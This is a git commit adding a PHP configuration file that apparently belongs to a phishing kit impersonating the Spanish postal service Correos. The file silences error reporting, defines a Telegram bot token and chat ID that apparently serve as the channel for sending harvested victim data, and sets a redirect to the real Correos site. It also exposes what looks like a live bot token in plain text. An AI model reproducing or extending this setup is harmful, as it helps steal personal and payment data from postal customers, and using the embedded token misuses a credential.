537983647a53c194ea9775a56e682a5cd2bf2075
ultviper20 <ult.viper20@gmail.Com>
2022-11-07 21:50:44 +0100

    first commit

---
+++ settings/conf.php
@@ -0,0 +1,11 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5702125764:AAH9GE2J2kLQvoVCToWLb50d73dhI30hT8M");
+define("TELEGRAM_CHAT_ID", "-1001629208928");
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
